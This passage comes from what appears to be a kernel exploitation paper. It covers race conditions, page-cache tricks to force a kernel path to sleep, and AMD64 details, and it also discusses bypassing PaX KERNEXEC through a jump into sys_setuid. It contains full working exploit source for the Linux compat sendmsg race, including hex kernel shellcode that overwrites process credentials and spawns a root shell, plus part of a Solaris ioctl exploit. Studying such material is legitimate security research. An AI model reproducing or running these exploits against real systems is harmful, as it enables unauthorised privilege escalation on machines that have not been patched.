#define DUMMY_FILE  "/tmp/test"

int main()
{
        int                     fd;
        int                     ret;
        struct test_comunique   t;
        unsigned long           *pbuf, retaddr, p_addr;

        memset(buf, 'A', BUFSIZ);

        p_addr = getaddr();

        printf("[*] - Using proc_t addr : %p \n", p_addr);

        retaddr = p_addr + UPSARGS_OFFSET + ALIGNPAD;

        printf("[*] - Using ret addr : %p\n", retaddr);

        pbuf = &buf[32];

        pbuf += 2;

        /* locals */

        for ( ret = 0; ret < 14; ret++ )
                *pbuf++ = 0xBBBBBBBB + ret;
        *pbuf++ = SAFE_FP;
        *pbuf = retaddr - 8;

        t.size = sizeof(buf);
        t.addr = buf;

        fd = open(DUMMY_FILE, O_RDONLY);

        ret = ioctl(fd, 1, &t);
        printf("fun %d\n", ret);

        exploit_me();
        close(fd);

}
 
< / >

The exploit is quite simple (we apologies, but we didn't have a public one
to show at time of writing) : 

  - getaddr() uses procfs exported psinfo data to get the proc_t address
    of the running process.

  - the return addr is calculated from proc_t addr + the offset of the
    u_psargs array + the three needed bytes for alignment
 
  - SAFE_FP points just 'somewhere in the data segment' (and ready to be
    biased for the real dereference). Due to SPARC window mechanism we
    have to provide a valid address that it will be used to 'load' the
    saved procedure registers upon re-entering. We don't write on that
    address so whatever readable kernel part is safe. (in more complex 
    scenarios you could have to write over too, so take care). 

  - /tmp/test is just a link to the /devices/pseudo/test@0:0 file      
  
  - the exploit has to be compiled as a 32-bit executable, so that the
    syscall_trap32 offset is meaningful 
  

You can compile and test the driver on your boxes, it's really simple. You
can extend it to test more scenarios, the skeleton is ready for it.


------[ 2.4 - A primer on logical bugs : race conditions


Heap and Stack Overflow (even more, NULL pointer dereference) are 
seldomly found on their own, and, since the automatic and human auditing
work goes on and on, they're going to be even more rare. 
What will probably survive for more time are 'logical bugs', which may
lead, at the end, to a classic overflow. 
Figure out a modelization of 'logical bugs' is, in our opinion, nearly 
impossible, each one is a story on itself.
Notwithstanding this, one typology of those is quite interesting (and
'widespread') and at least some basic approaches to it are suitable for a
generic description. 

We're talking about 'race conditions'. 

In short, we have a race condition everytime we have a small window of
time that we can use to subvert the operating system behaviour. A race
condition is usually the consequence of a forgotten lock or other
syncronization primitive or the use of a variable 'too much time after'
the sanitizing of its value. Just point your favorite vuln database search
engine towards 'kernel race condition' and you'll find many different
examples. 

Winning the race is our goal. This is easier on SMP systems, since the two 
racing threads (the one following the 'raceable kernel path' and the other
competing to win the race) can be scheduled (and be bounded) on different
CPUs. We just need to have the 'racing thread' go faster than the other 
one, since they both can execute in parallel.
Winning a race on UP is harder : we have to force the first kernel path
to sleep (and thus to re-schedule). We have also to 'force' the scheduler
into selecting our 'racing' thread, so we have to take care of scheduling
algorithm implementation (ex. priority based). On a system with a low CPU
load this is generally easy to get : the racing thread is usually
'spinning' on some condition and is likely the best candidate on the
runqueue. 

We're going now to focus more on 'forcing' a kernel path to sleep,
analyzing the nowadays common interface to access files, the page cache. 
After that we'll present the AMD64 architecture and show a real race
exploit for Linux on it, based on the sendmsg [5] vulnerability.
Winning the race in that case turns the vuln into a stack based one, so
the discussion will analize stack based explotation on Linux/AMD64 too.


---[ 2.4.1 - Forcing a kernel path to sleep 

  
If you want to win a race, what's better than slowing down your opponent?
And what's slower than accessing the hard disk, in a modern computer ? 
Operating systems designers know that the I/O over the disk is one of the
major bottleneck on system performances and know aswell that it is one of
the most frequent operations requested. 

Disk accessing and Virtual Memory are closely tied : virtual memory needs
to access the disk to accomplish demand paging and in/out swapping, while
the filesystem based I/O (both direct read/write and memory mapping of
files) works in units of pages and relays on VM functions to perform the
write out of 'dirty' pages. Moreover, to sensibly increase performances,
frequently accessed disk pages are kept in RAM, into the so-called 'Page
Cache'. 

Since RAM isn't an inexhaustible resource, pages to be loaded and 'cached'
into it have to be carefully 'selected'. The first skimming is made by the
'Demand Paging' approach : a page is loaded from disk into memory only
when it is referenced, by the page fault handler code. 
Once a filesystem page is loaded into memory, it enters into the 'Page
Cache' and stays in memory for an unspecified time (depending on disk
activity and RAM availability, generally a LRU policy is used as an
evict-policy). 
Since it's quite common for an userland application to repeatedly access
the same disk content/pages (or for different applications, to access
common files), the 'Page Cache' sensibly increases performances.

One last thing that we have to discuss is the filesystem 'page clustering'.
Another common principle in 'caching' is the 'locality'. Pages near the
referenced one are likely to be accessed in a near future and since we're
accessing the disk we can avoid the future seek-rotation latency if we
load in more pages after the referenced one. How many to load is
determined by the page cluster value. 
On Linux that value is 3, so 2^3 pages are loaded after the referenced
one. On Solaris, if the pages are 8-kb sized, the next eight pages on a
64kb boundary are brought in by the seg_vn driver (mmap-case).

Putting all together, if we want to force a kernel path to sleep we need
to make it reference an un-cached page, so that a 'fault' happens due to
demand paging implementation. The page fault handler needs to perform disk 
I/O, so the process is put to sleep and another one is selected by the
scheduler. Since probably we want aswell our 'controlled contents' to be
at the faulting address we need to mmap the pages, modify them and then
exhaust the page cache before making the kernel re-access them again. 

Filling the 'page cache' has also the effect of consuming a large quantity
of RAM and thus increasing the in/out swapping. On modern operating
systems one can't create a condition of memory pressure only by exhausting
the page cache (as it was possible on very old implementations), since
only some amount of RAM is dedicated to the Page Cache and it would keep
on stealing pages from itself, leaving other subsystems free to perform
well. But we can manage to exhaust those subsystem aswell, for example by
making the kernel do a large amount of 'surviving' slab-allocations. 

Working to put the VM under pressure is something to take always in mind,
since, done that, one can manage to slow down the kernel (favouring races)
and make kmalloc or other allocation function to fail. (A thing that
seldomly happens on normal behaviour). 

It is time, now, for another real life situation. We'll show the sendmsg
[5] vulnerability and exploiting code and we'll describe briefly the AMD64
architectural more exploiting-relevant details.  
   

---[ 2.4.2 - AMD64 and race condition exploiting: sendmsg


AMD64 is the 64-bit 'extension' of the x86 architecture, which is natively
supported. It supports 64-bit registers, pointers/virtual addresses and
integer/logic operations. AMD64 has two primary modes of operation, 'Long
mode', which is the standard 64-bit one (32-bit and 16-bit binaries can be
still run with almost no performance impact, or even, if recompiled, with
some benefit from the extended number of registers, thanks to the
sometimes-called 'compatibility mode') and 'Legacy mode', for 32-bit 
operating systems, which is basically just like having a standard x86
processor environment.

Even if we won't use all of them in the sendmsg exploit, we're going now
to sum a couple of interesting features of the AMD64 architecture :

  - The number of general purpose register has been extended from 8 up to 
    16. The registers are all 64-bit long (referred with 'r[name|num]',
    f.e. rax, r10). Just like what happened when took over the transition
    from 16-bit to 32-bit, the lower 32-bit of general purpose register 
    are accessible with the 'e' prefix (f.e. eax).

  - push/pop on the stack are 64-bit operations, so 8 bytes are
    pushed/popped each time. Pointers are 64-bit too and that allows a
    theorical virtual address space of 2^64 bytes. As happens for the
    UltraSPARC architecture, current implementations address a limited
    virtual address space (2^48 bytes) and thus have a VA-hole (the least
    significant 48 bits are used and bits from 48 up to 63 must be copies
    of bit 47 : the hole is thus between 0x7FFFFFFFFFFF and
    0xFFFF800000000000). 
    This limitation is strictly implementation-dependant, so any future
    implementation might take advantage of the full 2^64 bytes range.  
 
  - It is now possible to reference data relative to the Instruction
    Pointer register (RIP). This is both a good and a bad news, since it
    makes easier writing position independent (shell)code, but also makes
    it more efficient (opening the way for more performant PIE-alike
    implementations)

  - The (in)famous NX bit (bit 63 of the page table entry) is implemented
    and so pages can be marked as No-Exec by the operating system. This is 
    less an issue than over UltraSPARC since actually there's no operating
    system which implements a separated userspace/kernelspace addressing,
    thus leaving open space to the use of the 'return-to-userspace'
    tecnique. 

  - AMD64 doesn't support anymore (in 'long mode') the use of
    segmentation. This choice makes harder, in our opinion, the creation
    of a separated user/kernel address space. Moreover the FS and GS
    registers are still used for different pourposes. As we'll see, the
    Linux Operating System keeps the GS register pointing to the 'current'
    PDA (Per Processor Data Structure). (check : /include/asm-x86_64/pda.h 
    struct x8664_pda .. anyway we'll get back on that in a short).


After this brief summary (if you want to learn more about the AMD64
architecture you can check the reference manuals at [3]) it is time now to
focus over the 'real vulnerability', the sendmsg [5] one : 

"When we copy 32bit ->msg_control contents to kernel, we walk the
same userland data twice without sanity checks on the second pass.
Moreover, if original looks small enough, we end up copying to on-stack
array."
       
< linux-2.6.9/net/compat.c >

int cmsghdr_from_user_compat_to_kern(struct msghdr *kmsg,
                               unsigned char *stackbuf, int stackbuf_size)
{
        struct compat_cmsghdr __user *ucmsg;
        struct cmsghdr *kcmsg, *kcmsg_base;
        compat_size_t ucmlen;
        __kernel_size_t kcmlen, tmp;

        kcmlen = 0;
        kcmsg_base = kcmsg = (struct cmsghdr *)stackbuf;            [1]

[...]

        while(ucmsg != NULL) {
                if(get_user(ucmlen, &ucmsg->cmsg_len))              [2]
                        return -EFAULT;

                /* Catch bogons. */
                if(CMSG_COMPAT_ALIGN(ucmlen) <
                   CMSG_COMPAT_ALIGN(sizeof(struct compat_cmsghdr)))
                        return -EINVAL;
                if((unsigned long)(((char __user *)ucmsg - (char __user
*)kmsg->msg_control)
                                   + ucmlen) > kmsg->msg_controllen) [3]
                        return -EINVAL;

                tmp = ((ucmlen - CMSG_COMPAT_ALIGN(sizeof(*ucmsg))) +
                       CMSG_ALIGN(sizeof(struct cmsghdr)));
                kcmlen += tmp;                                       [4]
                ucmsg = cmsg_compat_nxthdr(kmsg, ucmsg, ucmlen);
        }

[...]

        if(kcmlen > stackbuf_size)                                   [5] 
                kcmsg_base = kcmsg = kmalloc(kcmlen, GFP_KERNEL);

[...]

        while(ucmsg != NULL) {
                __get_user(ucmlen, &ucmsg->cmsg_len);                [6]
                tmp = ((ucmlen - CMSG_COMPAT_ALIGN(sizeof(*ucmsg))) +
                       CMSG_ALIGN(sizeof(struct cmsghdr)));
                kcmsg->cmsg_len = tmp;
                __get_user(kcmsg->cmsg_level, &ucmsg->cmsg_level);
                __get_user(kcmsg->cmsg_type, &ucmsg->cmsg_type);

                /* Copy over the data. */
                if(copy_from_user(CMSG_DATA(kcmsg),                  [7]
                                  CMSG_COMPAT_DATA(ucmsg),
                                  (ucmlen -
CMSG_COMPAT_ALIGN(sizeof(*ucmsg)))))
                        goto out_free_efault;


< / >


As it is said in the advisory, the vulnerability is a double-reference to
some userland data (at [2] and at [6]) without sanitizing the value the
second time it is got from the userland (at [3] the check is performed,
instead). That 'data' is the 'size' of the user-part to copy-in
('ucmlen'), and it's used, at [7], inside the copy_from_user. 

This is a pretty common scenario for a race condition : if we create two
different threads, make the first one enter the codepath and , after [4],
we manage to put it to sleep and make the scheduler choice the other
thread, we can change the 'ucmlen' value and thus perform a 'buffer
overflow'. 

The kind of overflow we're going to perform is 'decided' at [5] : if the
len is little, the buffer used will be in the stack, otherwise it will be
kmalloc'ed. Both the situation are exploitable, but we've chosen the stack
based one (we have already presented a slab exploit for the Linux
operating system before). We're going to use, inside the exploit, the
tecnique we've presented in the subsection before to force a process to
sleep, that is making it access data on a cross page boundary (with the
second page never referenced before nor already swapped in by the page
clustering mechanism) :

+------------+ --------> 0x20020000 [MMAP_ADDR + 32 * PAGE_SIZE] [*]
|            |
| cmsg_len   |           first cmsg_len starts at 0x2001fff4
| cmsg_level |           first struct compat_cmsghdr
| cmsg_type  |
|------------| -------->              0x20020000  [cross page boundary]
| cmsg_len   |           second cmsg_len starts at 0x20020000)
| cmsg_level |           second struct compat_cmsghdr
| cmsg_type  |
|            |
+------------+ --------> 0x20021000

[*] One of those so-called 'runtime adjustement'. The page clustering
    wasn't showing the expected behaviour in the first 32 mmaped-pages,
    while was just working as expected after.


As we said, we're going to perform a stack-based explotation writing past
the 'stackbuf' variable. Let's see where we get it from : 

< linux-2.6.9/net/socket.c > 

asmlinkage long sys_sendmsg(int fd, struct msghdr __user *msg, unsigned
flags)
{
        struct compat_msghdr __user *msg_compat =
        (struct compat_msghdr __user *)msg;
        struct socket *sock;
        char address[MAX_SOCK_ADDR];
        struct iovec iovstack[UIO_FASTIOV], *iov = iovstack;
        unsigned char ctl[sizeof(struct cmsghdr) + 20];
        unsigned char *ctl_buf = ctl;
        struct msghdr msg_sys;
        int err, ctl_len, iov_size, total_len;
[...]

        if ((MSG_CMSG_COMPAT & flags) && ctl_len) {
err = cmsghdr_from_user_compat_to_kern(&msg_sys, ctl, sizeof(ctl));

[...]

< / >

The situation is less nasty as it seems (at least on the systems we tested
the code on) : thanks to gcc reordering the stack variables we get our
'msg_sys' struct placed as if it was the first variable.
That simplifies a lot our exploiting task, since we don't have to take
care of 'emulating' in userspace the structure referenced between our
overflow and the 'return' of the function (for example the struct sock).
Exploiting in this 'second case' would be slightly more complex, but
doable aswell.

The shellcode for the exploit is not much different (as expected, since
the AMD64 is a 'superset' of the x86 architecture) from the ones provided
before for the Linux/x86 environment, netherless we've two focus on two
important different points : the 'thread/task struct dereference' and the
'userspace context switch approach'. 

For the first point, let's start analyzing the get_current()
implementation : 

< linux-2.6.9/include/asm-x86_64/current.h >

#include <asm/pda.h>

static inline struct task_struct *get_current(void)
{
        struct task_struct *t = read_pda(pcurrent);
        return t;
}

#define current get_current()

[...]

#define GET_CURRENT(reg) movq %gs:(pda_pcurrent),reg

< / > 

< linux-2.6.9/include/asm-x86_64/pda.h >

struct x8664_pda {
        struct task_struct *pcurrent;   /* Current process */
        unsigned long data_offset;      /* Per cpu data offset from linker
address */
        struct x8664_pda *me;       /* Pointer to itself */
        unsigned long kernelstack;  /* top of kernel stack for current */
[...]

#define pda_from_op(op,field) ({ \
       typedef typeof_field(struct x8664_pda, field) T__; T__ ret__; \
       switch (sizeof_field(struct x8664_pda, field)) {                 \
case 2: \
asm volatile(op "w %%gs:%P1,%0":"=r"
(ret__):"i"(pda_offset(field)):"memory"); break;\
[...]

#define read_pda(field) pda_from_op("mov",field)
 
< / > 

The task_struct is thus no more into the 'current stack' (more precisely,
referenced from the thread_struct which is actually saved into the
'current stack'), but is stored into the 'struct x8664_pda'. This struct
keeps many information relative to the 'current' process and the CPU it is
running over (kernel stack address, irq nesting counter, cpu it is running
over, number of NMI on that cpu, etc).
As you can see from the 'pda_from_op' macro, during the execution of a
Kernel Path, the address of the 'struct x8664_pda' is kept inside the %gs
register. Moreover, the 'pcurrent' member (which is the one we're actually
interested in) is the first one, so obtaining it from inside a shellcode
is just a matter of doing a : 

	movq %gs:0x0, %rax 

From that point on the 'scanning' to locate uid/gid/etc is just the same
used in the previously shown exploits. 

The second point which quite differs from the x86 case is the 'restore'
part (which is, also, a direct consequence of the %gs using). 
First of all we have to do a '64-bit based' restore, that is we've to push
the 64-bit registers RIP,CC,RFLAGS,RSP and SS and call, at the end, the
'iretq' instruction (the extended version of the 'iret' one on x86).
Just before returning we've to remember to perform the 'swapgs'
instruction, which swaps the %gs content with the one of the KernelGSbase
(MSR address C000_0102h).
If we don't perform the gs restoring, at the next syscall or interrupt the
kernel will use an invalid value for the gs register and will just crash. 

Here's the shellcode in asm inline notation :

void stub64bit()
{
asm volatile (
                "movl %0, %%esi\t\n"
                "movq %%gs:0, %%rax\n"
                "xor %%ecx, %%ecx\t\n"
                "1: cmp $0x12c, %%ecx\t\n"
                "je 4f\t\n"
                "movl (%%rax), %%edx\t\n"
                "cmpl %%esi, %%edx\t\n"
                "jne 3f\t\n"
                "movl 0x4(%%rax),%%edx\t\n"
                "cmp %%esi, %%edx\t\n"
                "jne 3f\t\n"
                "xor %%edx, %%edx\t\n"
                "movl %%edx, 0x4(%%rax)\t\n"
                "jmp 4f\t\n"
                "3: add $4,%%rax\t\n"
                "inc %%ecx\t\n"
                "jmp 1b\t\n"
                "4:\t\n"
                "swapgs\t\n"
                "movq $0x000000000000002b,0x20(%%rsp)\t\n"
                "movq %1,0x18(%%rsp)\t\n"
                "movq $0x0000000000000246,0x10(%%rsp)\t\n"
                "movq $0x0000000000000023,0x8(%%rsp)\t\n"
                "movq %2,0x0(%%rsp)\t\n"
                "iretq\t\n"
                : : "i"(UID), "i"(STACK_OFFSET), "i"(CODE_OFFSET)
                );
}

With UID being the 'uid' of the current running process and STACK_OFFSET
and CODE_OFFSET the address of the stack and code 'segment' we're
returning into in userspace. All those values are taken and patched at
runtime in the exploit 'make_kjump' function : 

< stuff/expl/linux/sracemsg.c > 

#define PAGE_SIZE 0x1000
#define MMAP_ADDR ((void*)0x20000000)
#define MMAP_NULL ((void*)0x00000000)
#define PAGE_NUM 128

#define PATCH_CODE(base,offset,value) \
       *((uint32_t *)((char*)base + offset)) = (uint32_t)(value)

#define fatal_errno(x,y) { perror(x); exit(y); }

struct cmsghdr *g_ancillary;

/* global shared value to sync threads for race */
volatile static int glob_race = 0;

#define UID_OFFSET 1
#define STACK_OFF_OFFSET 69
#define CODE_OFF_OFFSET  95

[...]

int make_kjump(void)
{
  void *stack_map = mmap((void*)(0x11110000), 0x2000,
PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, 0, 0);
  if(stack_map == MAP_FAILED)
    fatal_errno("mmap", 1);


  void *shellcode_map = mmap(MMAP_NULL, 0x1000,
PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, 0,
0);
  if(shellcode_map == MAP_FAILED)
    fatal_errno("mmap", 1);

  memcpy(shellcode_map, kernel_stub, sizeof(kernel_stub)-1);

  PATCH_CODE(MMAP_NULL, UID_OFFSET, getuid());
  PATCH_CODE(MMAP_NULL, STACK_OFF_OFFSET, 0x11111111);
  PATCH_CODE(MMAP_NULL, CODE_OFF_OFFSET,  &eip_do_exit);
}

< / > 
 

The rest of the exploit should be quite self-explanatory and we're going
to show the code here after in a short. Note the lowering of the priority
inside start_thread_priority ('nice(19)'), so that we have some more
chance to win the race (the 'glob_race' variable works just like a
spinning lock for the main thread - check 'race_func()').

As a last note, we use the 'rdtsc' (read time stamp counter) instruction
to calculate the time that intercurred while trying to win the race. If
this gap is high it is quite probable that a scheduling happened. 
The task of 'flushing all pages' (inside page cache), so that we'll be
sure that we'll end using demand paging on cross boundary access, is not
implemented inside the code (it could have been easily added) and is left
to the exploit runner. Since we have to create the file with controlled
data, those pages end up cached in the page cache. We have to force the
subsystem into discarding them. It shouldn't be hard for you, if you
followed the discussion so far, to perform tasks that would 'flush the
needed pages' (to disk) or add code to automatize it. (hint : mass find &
cat * > /dev/null is an idea).

Last but not least, since the vulnerable function is inside 'compat.c',
which is the 'compatibility mode' to run 32-bit based binaries, remember to
compile the exploit with the -m32 flag.

< stuff/expl/linux/sracemsg.c >
   
#include <stdio.h>
#include <signal.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sched.h>
#include <sys/socket.h>

#define PAGE_SIZE 0x1000
#define MMAP_ADDR ((void*)0x20000000)
#define MMAP_NULL ((void*)0x00000000)
#define PAGE_NUM 128

#define PATCH_CODE(base,offset,value) \
       *((uint32_t *)((char*)base + offset)) = (uint32_t)(value)

#define fatal_errno(x,y) { perror(x); exit(y); }

struct cmsghdr *g_ancillary;

/* global shared value to sync threads for race */
volatile static int glob_race = 0;

#define UID_OFFSET 1
#define STACK_OFF_OFFSET 69
#define CODE_OFF_OFFSET  95

char kernel_stub[] =

"\xbe\xe8\x03\x00\x00"                   //  mov    $0x3e8,%esi
"\x65\x48\x8b\x04\x25\x00\x00\x00\x00"   //  mov    %gs:0x0,%rax
"\x31\xc9"                               //  xor    %ecx,%ecx  (15
"\x81\xf9\x2c\x01\x00\x00"               //  cmp    $0x12c,%ecx
"\x74\x1c"                               //  je     400af0
<stub64bit+0x38>
"\x8b\x10"                               //  mov    (%rax),%edx
"\x39\xf2"                               //  cmp    %esi,%edx
"\x75\x0e"                               //  jne    400ae8
<stub64bit+0x30>
"\x8b\x50\x04"                           //  mov    0x4(%rax),%edx
"\x39\xf2"                               //  cmp    %esi,%edx
"\x75\x07"                               //  jne    400ae8
<stub64bit+0x30>
"\x31\xd2"                               //  xor    %edx,%edx
"\x89\x50\x04"                           //  mov    %edx,0x4(%rax)
"\xeb\x08"                               //  jmp    400af0
<stub64bit+0x38>
"\x48\x83\xc0\x04"                       //  add    $0x4,%rax
"\xff\xc1"                               //  inc    %ecx
"\xeb\xdc"                               //  jmp    400acc
<stub64bit+0x14>
"\x0f\x01\xf8"                           //  swapgs (54
"\x48\xc7\x44\x24\x20\x2b\x00\x00\x00"   //  movq   $0x2b,0x20(%rsp)
"\x48\xc7\x44\x24\x18\x11\x11\x11\x11"   //  movq   $0x11111111,0x18(%rsp)
"\x48\xc7\x44\x24\x10\x46\x02\x00\x00"   //  movq   $0x246,0x10(%rsp)
"\x48\xc7\x44\x24\x08\x23\x00\x00\x00"   //  movq   $0x23,0x8(%rsp)  /* 23
32-bit , 33 64-bit cs */
"\x48\xc7\x04\x24\x22\x22\x22\x22"       //  movq   $0x22222222,(%rsp)
"\x48\xcf";                              //  iretq


void eip_do_exit(void)
{
  char *argvx[] = {"/bin/sh", NULL};
  printf("uid=%d\n", geteuid());
  execve("/bin/sh", argvx, NULL);
  exit(1);
}


/*
 * This function maps stack and code segment
 * - 0x0000000000000000 - 0x0000000000001000   (future code space)
 * - 0x0000000011110000 - 0x0000000011112000   (future stack space)
 */

int make_kjump(void)
{
  void *stack_map = mmap((void*)(0x11110000), 0x2000,
PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, 0, 0);
  if(stack_map == MAP_FAILED)
    fatal_errno("mmap", 1);


  void *shellcode_map = mmap(MMAP_NULL, 0x1000,
PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, 0,
0);
  if(shellcode_map == MAP_FAILED)
    fatal_errno("mmap", 1);

  memcpy(shellcode_map, kernel_stub, sizeof(kernel_stub)-1);

  PATCH_CODE(MMAP_NULL, UID_OFFSET, getuid());
  PATCH_CODE(MMAP_NULL, STACK_OFF_OFFSET, 0x11111111);
  PATCH_CODE(MMAP_NULL, CODE_OFF_OFFSET,  &eip_do_exit);
}

int start_thread_priority(int (*f)(void *), void* arg)
{
  char *stack = malloc(PAGE_SIZE*4);
  int tid = clone(f, stack + PAGE_SIZE*4 -4,
CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_VM, arg);
  if(tid < 0)
  fatal_errno("clone", 1);

  nice(19);
  sleep(1);
  return tid;
}

int race_func(void* noarg)
{
  printf("[*] thread racer getpid()=%d\n", getpid());
  while(1)
  {
    if(glob_race)
    {
      g_ancillary->cmsg_len = 500;
      return;
    }
  }
}

uint64_t tsc()
{
  uint64_t ret;
  asm volatile("rdtsc" : "=A"(ret));

  return ret;
}

struct tsc_stamp
{
  uint64_t before;
  uint64_t after;
  uint32_t access;
};

struct tsc_stamp stamp[128];

inline char *flat_file_mmap(int fs)
{
  void *addr = mmap(MMAP_ADDR, PAGE_SIZE*PAGE_NUM, PROT_READ|PROT_WRITE,
MAP_SHARED|MAP_FIXED, fs, 0);
  if(addr == MAP_FAILED)
    fatal_errno("mmap", 1);
  return (char*)addr;
}

void scan_addr(char *memory)
{
  int i;
  for(i=1; i<PAGE_NUM-1; i++)
  {
    stamp[i].access = (uint32_t)(memory + i*PAGE_SIZE);
    uint32_t dummy = *((uint32_t *)(memory + i*PAGE_SIZE-4));
    stamp[i].before = tsc();
    dummy = *((uint32_t *)(memory + i*PAGE_SIZE));
    stamp[i].after  = tsc();

  }
}

/* make code access first 32 pages to flush page-cluster */
/* access: 0x20000000 - 0x2000XXXX */

void start_flush_access(char *memory, uint32_t page_num)
{
  int i;
  for(i=0; i<page_num; i++)
  {
    uint32_t dummy = *((uint32_t *)(memory + i*PAGE_SIZE));
  }
}


void print_single_result(struct tsc_stamp *entry)
{
  printf("Accessing: %p, tsc-difference: %lld\n", entry->access,
entry->after - entry->before);
}


void print_result()
{
  int i;
  for(i=1; i<PAGE_NUM-1; i++)
  {
    printf("Accessing: %p, tsc-difference: %lld\n", stamp[i].access,
stamp[i].after - stamp[i].before);
  }
}


void fill_ancillary(struct msghdr *msg, char *ancillary)
{
  msg->msg_control = ((ancillary + 32*PAGE_SIZE) - sizeof(struct
cmsghdr));
  msg->msg_controllen = sizeof(struct cmsghdr) * 2;

  /* set global var thread race ancillary data chunk */
  g_ancillary = msg->msg_control;

  struct cmsghdr* tmp = (struct cmsghdr *)(msg->msg_control);
  tmp->cmsg_len   = sizeof(struct cmsghdr);
  tmp->cmsg_level = 0;
  tmp->cmsg_type  = 0;
  tmp++;

  tmp->cmsg_len   = sizeof(struct cmsghdr);
  tmp->cmsg_level = 0;
  tmp->cmsg_type  = 0;
  tmp++;

  memset(tmp, 0x00, 172);
}

int main()
{
  struct tsc_stamp single_stamp = {0};
  struct msghdr msg = {0};

  memset(&stamp, 0x00, sizeof(stamp));
  int fd = open("/tmp/file", O_RDWR);
  if(fd == -1)
    fatal_errno("open", 1);

  char *addr = flat_file_mmap(fd);

  fill_ancillary(&msg, addr);

  munmap(addr, PAGE_SIZE*PAGE_NUM);
  close(fd);
  make_kjump();
  sync();

  printf("Flush all pages and press a enter:)\n");
  getchar();

  fd = open("/tmp/file", O_RDWR);
  if(fd == -1)
    fatal_errno("open", 1);
  addr = flat_file_mmap(fd);

  int t_pid = start_thread_priority(race_func, NULL);
  printf("[*] thread main getpid()=%d\n", getpid());

  start_flush_access(addr, 32);


  int sc[2];
  int sp_ret = socketpair(AF_UNIX, SOCK_STREAM, 0, sc);
  if(sp_ret < 0)
    fatal_errno("socketpair", 1);

  single_stamp.access = (uint32_t)g_ancillary;
  single_stamp.before = tsc();

  glob_race =1;
  sendmsg(sc[0], &msg, 0);

  single_stamp.after = tsc();

  print_single_result(&single_stamp);

  kill(t_pid, SIGKILL);
  munmap(addr, PAGE_SIZE*PAGE_NUM);
  close(fd);
  return 0;
}

< / > 


------[ 3 - Advanced scenarios 


In an attempt to ''complete'' our tractation on kernel exploiting we're
now going to discuss two 'advanced scenarios' : a stack based kernel
exploit capable to bypass PaX [18] KERNEXEC and Userland / Kernelland
split and an effective remote exploit, both for the Linux kernel. 


---[ 3.1 - PaX KERNEXEC & separated kernel/user space


The PaX KERNEXEC option emulates a no-exec bit for pages at kernel land
on an architecture which hasn't it (x86), while the User / Kerne Land
split blocks the 'return-to-userland' approach that we have extensively
described and used in the paper. With those two protections active we're
basically facing the same scenario we encountered discussing the 
Solaris/SPARC environment, so we won't go in more details here (to avoid
duplicating the tractation). 

This time, thou, we won't have any executable and controllable memory area
(no u_psargs array), and we're going to present a different tecnique which
doesn't require to have one. Even if the idea behind applyes well to any
no-exec and separated kernel/userspace environment, as we'll see in a
short, this approach is quite architectural (stack management and function
call/return implementation) and Operating System (handling of credentials)
specific. 

Moreover, it requires a precise knowledge of the .text layout of the
running kernel, so at least a readable image (which is a default situation
on many distros, on Solaris, and on other operating systems we checked) or
a large or controlled infoleak is necessary. 

The idea behind is not much different from the theory behind
'ret-into-libc' or other userland exploiting approaches that attempt to
circumvent the non executability of heap and stack : as we know, Linux
associates credentials to each process in term of numeric values :

< linux-2.6.15/include/linux/sched.h >

struct task_struct {
[...]
/* process credentials */
        uid_t uid,euid,suid,fsuid;
        gid_t gid,egid,sgid,fsgid;
[...]
}

< / > 

Sometimes a process needs to raise (or drop, for security reasons) its
credentials, so the kernel exports systemcalls to do that. 
One of those is sys_setuid :

< linux-2.6.15/kernel/sys.c >

asmlinkage long sys_setuid(uid_t uid)
{
        int old_euid = current->euid;
        int old_ruid, old_suid, new_ruid, new_suid;
        int retval;

        retval = security_task_setuid(uid, (uid_t)-1, (uid_t)-1,
LSM_SETID_ID);
        if (retval)
                return retval;

        old_ruid = new_ruid = current->uid;
        old_suid = current->suid;
        new_suid = old_suid;

        if (capable(CAP_SETUID)) {              [1]
                if (uid != old_ruid && set_user(uid, old_euid != uid) < 0)
                        return -EAGAIN;
                new_suid = uid;
        } else if ((uid != current->uid) && (uid != new_suid))
                return -EPERM;

        if (old_euid != uid)
        {
                current->mm->dumpable = suid_dumpable;
                smp_wmb();
        }
        current->fsuid = current->euid = uid;    [2] 
        current->suid = new_suid;

        key_fsuid_changed(current);
        proc_id_connector(current, PROC_EVENT_UID);

        return security_task_post_setuid(old_ruid, old_euid, old_suid,
LSM_SETID_ID);
}

< / > 

As you can see, the 'security' checks (out of the LSM security_* entry
points) are performed at [1] and after those, at [2] the values of fsuid
and euid are set equal to the value passed to the function. 
sys_setuid is a system call, so, due to systemcall convention, parameters
are passed in register. More precisely, 'uid' will be passed in '%ebx'. 
The idea is so simple (and not different from 'ret-into-libc' [19] or 
other userspace page protection evading tecniques like [20]), if we manage
to have 0 into %ebx and to jump right in the middle of sys_setuid (and
right after the checks) we should be able to change the 'euid' and 'fsuid'
of our process and thus raise our priviledges. 

Let's see the sys_setuid disassembly to better tune our idea :

[...]
c0120fd0:       b8 00 e0 ff ff          mov    $0xffffe000,%eax  [1]
c0120fd5:       21 e0                   and    %esp,%eax
c0120fd7:       8b 10                   mov    (%eax),%edx
c0120fd9:       89 9a 6c 01 00 00       mov    %ebx,0x16c(%edx)  [2]
c0120fdf:       89 9a 74 01 00 00       mov    %ebx,0x174(%edx)
c0120fe5:       8b 00                   mov    (%eax),%eax
c0120fe7:       89 b0 70 01 00 00       mov    %esi,0x170(%eax)
c0120fed:       6a 01                   push   $0x1
c0120fef:       8b 44 24 04             mov    0x4(%esp),%eax
c0120ff3:       50                      push   %eax
c0120ff4:       55                      push   %ebp
c0120ff5:       57                      push   %edi
c0120ff6:       e8 65 ce 0c 00          call   c01ede60
c0120ffb:       89 c2                   mov    %eax,%edx
c0120ffd:       83 c4 10                add    $0x10,%esp        [3]  
c0121000:       89 d0                   mov    %edx,%eax
c0121002:       5e                      pop    %esi
c0121003:       5b                      pop    %ebx
c0121004:       5e                      pop    %esi
c0121005:       5f                      pop    %edi
c0121006:       5d                      pop    %ebp
c0121007:       c3                      ret


